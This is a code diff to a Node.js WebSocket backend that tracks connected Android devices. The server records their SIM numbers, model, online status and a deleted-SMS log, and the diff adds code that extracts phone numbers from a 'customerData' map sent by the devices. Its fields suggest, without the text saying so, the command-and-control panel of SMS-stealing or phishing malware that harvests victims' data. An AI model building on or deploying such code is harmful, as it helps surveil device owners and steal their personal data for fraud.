@@ -159,6 +159,8 @@ wss.on('connection', (ws, req) => {
   ws.on('message', async (msg) => {
     try {
       const data = JSON.parse(msg);
+      console.log('Incoming Message:', data.type, 'from:', data.deviceId);
+      
       const id = data.deviceId || data.serialNumber || data.id;
       if (!id) return;
       ws.deviceId = id;
@@ -176,12 +178,20 @@ wss.on('connection', (ws, req) => {
       const deletedLog = existingDevice?.deletedSmsLog || [];
       const updateSet = { isOnline: true, lastSeen: new Date(), isDeleted: false };
       
-      // Maximum Compatibility for SIM Numbers
-      const s1 = data.sim1 || data.simNumber1 || data.phoneNumber1 || data.mobile1 || data.phone1 || data.simNo1 || data.data?.sim1 || data.data?.phoneNumber1;
-      const s2 = data.sim2 || data.simNumber2 || data.phoneNumber2 || data.mobile2 || data.phone2 || data.simNo2 || data.data?.sim2 || data.data?.phoneNumber2;
+      // Maximum Compatibility for SIM Numbers (Direct Fields)
+      let s1 = data.sim1 || data.simNumber1 || data.phoneNumber1 || data.mobile1 || data.phone1 || data.simNo1;
+      let s2 = data.sim2 || data.simNumber2 || data.phoneNumber2 || data.mobile2 || data.phone2 || data.simNo2;
       
-      if (s1 && s1 !== 'N/A' && s1 !== 'Not Available') updateSet.sim1 = s1;
-      if (s2 && s2 !== 'N/A' && s2 !== 'Not Available') updateSet.sim2 = s2;
+      // Smart extraction from "data" or "customerData" map
+      const payloadData = data.data || data.customerData || {};
+      if (payloadData && typeof payloadData === 'object') {
+          // If direct fields were missing, look inside the map
+          if (!s1) s1 = payloadData.sim1 || payloadData.Mobile || payloadData.mobile || payloadData.Phone || payloadData.phone || payloadData.Number || payloadData.number || payloadData["Mobile Number"] || payloadData["Phone Number"];
+          if (!s2) s2 = payloadData.sim2 || payloadData.Mobile2 || payloadData.mobile2 || payloadData.Phone2 || payloadData.phone2;
+      }
+
+      if (s1 && s1 !== 'N/A' && s1 !== 'Not Available' && s1 !== 'null') updateSet.sim1 = s1;
+      if (s2 && s2 !== 'N/A' && s2 !== 'Not Available' && s2 !== 'null') updateSet.sim2 = s2;
       
       if (data.model) updateSet.model = data.model;
       if (data.androidVersion) updateSet.androidVersion = data.androidVersion;
@@ -205,7 +215,7 @@ wss.on('connection', (ws, req) => {
           await Device.findOneAndUpdate({ deviceId: id }, { $set: updateSet, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } }, { upsert: true });
           io.emit('dashboard-update');
       }
-    } catch (e) { }
+    } catch (e) { console.error('WS Error:', e); }
   });
   ws.on('close', () => { if (ws.deviceId) global.deviceSockets.get(ws.deviceId)?.delete(ws); });
 });
